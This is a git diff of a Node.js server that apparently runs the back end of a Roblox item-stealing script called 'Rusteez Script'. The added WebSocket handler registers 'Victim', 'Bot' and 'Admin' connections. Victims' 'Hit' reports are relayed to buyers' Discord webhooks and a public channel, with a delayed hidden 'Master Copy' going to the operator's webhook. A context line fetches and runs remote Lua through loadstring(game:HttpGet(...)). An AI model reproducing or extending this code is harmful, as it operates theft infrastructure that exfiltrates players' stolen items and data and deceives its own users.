@@ -3,12 +3,14 @@ const mongoose = require('mongoose');
 const WebSocket = require('ws');
 const http = require('http');
 const url = require('url');
+const luamin = require('luamin');
 const { randomBytes } = require('node:crypto'); // Utilise le préfixe node: pour être sûr
 const { v4: uuidv4 } = require('uuid');
 const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags, WebhookClient } = require('discord.js');
 const app = express();
 app.use(express.json());
 const server = http.createServer(app);
+const wss = new WebSocket.Server({ server });
 const axios = require('axios');
 const { PastefyClient } = require('@interaapps/pastefy');
 
@@ -159,6 +161,11 @@ hitEventSchema.index({ timestamp: -1 });
 
 const HitEvent = mongoose.model('HitEvent', hitEventSchema);
 const WebHookId = mongoose.model('WebHookId', WebHookIdSchema);
+
+const activeVictims = new Map();
+const activeBots = new Map();
+const activeAdmins = new Set();
+
 
 // --- BOT DISCORD ---
 const clientDiscord = new Client({ 
@@ -384,51 +391,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/MyS
 if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
 // 1. Récupérer tous les webhooks
 
-app.post('/api/hit', async (req, res) => {
-    try {
-        const data = req.body;
-        if (!data || data.Method !== "Hit") {
-            return res.status(200).json({ status: "ignored" }); // On répond 200 même si c'est invalide
-        }
-
-        const hitInfo = data.Hit;
-        const webhookIdFromLua = hitInfo.WebHook;
-
-        res.status(200).json({ status: "received" });
-        const mapping = await WebHookId.findOne({ webhookId: webhookIdFromLua });
-        
-        if (!mapping) {
-            return log(`ℹ️ Hit ignoré : Webhook ID ${webhookIdFromLua} inexistant.`);
-        }
-
-        log(`🎯 Processing Hit: ${hitInfo.Name} pour ${mapping.userName}`);
-
-        Promise.all([
-            IncrementLeaderboard(mapping),
-            PostOnPrivateWebHook(mapping.url, hitInfo),
-            PostOnPublicWebHook(hitInfo)
-        ]).catch(err => log(`⚠️ Error in background tasks: ${err.message}`));
-
-        // 4. LOGIQUE MASTER (Attente 120 secondes)
-        setTimeout(async () => {
-            try {
-                const masterUrl = process.env.WEBHOOK_URL;
-                if (masterUrl && masterUrl !== mapping.url) {
-                    log(`⏳ Master Copy envoyée (120s delay) : ${hitInfo.Name}`);
-                    await PostOnPrivateWebHook(masterUrl, hitInfo);
-                }
-            } catch (err) {
-                log(`⚠️ Error Delayed Master: ${err.message}`);
-            }
-        }, 120000);
-
-    } catch (err) {
-        log(`⚠️ Route API Error: ${err.message}`);
-        // Sécurité au cas où la réponse n'aurait pas été envoyée
-        if (!res.headersSent) res.status(200).send();
-    }
-});
-
 app.get('/api/admin/hits-summary', async (req, res) => {
     const token = req.query.token;
     if (token !== ADMIN_TOKEN) return res.status(403).json({ error: "Unauthorized" });
@@ -480,7 +442,6 @@ app.delete('/api/admin/webhooks/:id', async (req, res) => {
 app.get('/api/admin/verify', (req, res) => {
     res.json({ success: req.query.token === ADMIN_TOKEN });
 });
-
 app.post('/api/admin/post-update', async (req, res) => {
     const token = req.query.token || req.body.token;
     
@@ -527,6 +488,107 @@ app.post('/api/admin/post-update', async (req, res) => {
         log(`❌ [UPDATE ERROR] ${error.message}`);
         res.status(500).json({ error: "Failed to send discord message" });
     }
+});
+
+// --- GESTION WEBSOCKET ---
+wss.on('connection', (ws, req) => {
+    const params = new URLSearchParams(url.parse(req.url, true).query);
+    const username = params.get('username') || "Unknown";
+    const usertype = params.get('usertype') || "Unknown";
+  
+    if (usertype === "Admin") {
+        activeAdmins.add(ws);
+        log("👨‍💻 Un administrateur s'est connecté");
+
+        ws.on('close', () => {
+            activeAdmins.delete(ws);
+            log("👨‍💻 Un administrateur s'est déconnecté");
+        });
+        return; // On s'arrête ici pour les admins
+    }
+  
+    if (usertype === "Bot") {
+        if (activeBots.has(username)) {
+            log(`Bot ${username} déjà présent, remplacement...`);
+            activeBots.get(username).terminate();
+        }
+    
+        activeBots.set(username, ws);
+        log(`🤖 Bot connecté : ${username}`);
+
+        ws.on('close', () => {
+            if (activeBots.get(username) === ws) {
+                activeBots.delete(username);
+                log(`💀 Bot déconnecté : ${username}`);
+            }
+        });
+        return; // On s'arrête ici pour les bots
+    }
+  
+    if (usertype === "Victim") {
+        if (activeVictims.has(username)) {
+            log(`Victim ${username} déjà présent, remplacement...`);
+            activeVictims.get(username).ws.terminate(); // Note le .ws ici
+        }
+        
+        activeVictims.set(username, {
+            ws: ws,
+            maxIncome: 0,
+            connectedAt: Date.now() // On stocke le timestamp actuel
+        });
+        
+        log(`🤖 Victim connecté : ${username}`);
+        
+        ws.on('close', () => {
+            const victim = activeVictims.get(username);
+            if (victim && victim.ws === ws) {
+                activeVictims.delete(username);
+                log(`💀 Victim déconnecté : ${username}`);
+            }
+        });
+      
+        ws.on('message', async (msg) => {
+            try {
+                const data = JSON.parse(msg);
+                if (data.Method === "Hit") {
+                    const hitInfo = data.Hit;
+                    const webhookIdFromLua = hitInfo.WebHook;
+                    
+                    const mapping = await WebHookId.findOne({ webhookId: webhookIdFromLua });
+                        
+                    if (!mapping) {
+                        return log(`ℹ️ Hit ignoré : Webhook ID ${webhookIdFromLua} inexistant.`);
+                    }
+                    
+                    log(`🎯 Processing Hit: ${hitInfo.Name} pour ${mapping.userName}`);
+                    
+                    Promise.all([
+                        IncrementLeaderboard(mapping),
+                        PostOnPrivateWebHook(mapping.url, hitInfo),
+                        PostOnPublicWebHook(hitInfo)
+                    ]).catch(err => log(`⚠️ Error in background tasks: ${err.message}`));
+                    
+                        // 4. LOGIQUE MASTER (Attente 120 secondes)
+                    setTimeout(async () => {
+                        try {
+                            const masterUrl = process.env.WEBHOOK_URL;
+                            if (masterUrl && masterUrl !== mapping.url) {
+                                log(`⏳ Master Copy envoyée (120s delay) : ${hitInfo.Name}`);
+                                await PostOnPrivateWebHook(masterUrl, hitInfo);
+                            }
+                        } catch (err) {
+                            log(`⚠️ Error Delayed Master: ${err.message}`);
+                        }
+                    }, 120000);
+                } 
+            }
+            catch (err) {
+                log(`⚠️ Ws API Error: ${err.message}`);
+            }     
+        });
+      return; // On s'arrête ici pour les Victims
+    }
+    
 });
 async function IncrementLeaderboard(mapping) {
     try {
@@ -652,6 +714,7 @@ async function PostOnPublicWebHook(hitInfo) {
         log(`⚠️ Public Channel Error: ${err.message}`);
     }
 }
+
 async function sendManualHit(hitData) {
     const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
     if (!publicChannel) throw new Error("Public Channel introuvable");
@@ -668,6 +731,12 @@ async function sendManualHit(hitData) {
             {
                 name: "👑 Valuable Brainrots",
                 value: `\`\`\`properties\n${hitData.brainrots}\n\`\`\``
+            },
+            {
+                // NOUVEAU FIELD POUR LE LIEN
+                name: "🔗 Discord",
+                value: `**[Join Rusteez Server](https://discord.gg/78CmkaUhZy)**`,
+                inline: false
             }
         )
         .setFooter({ text: `Rusteez Script`})
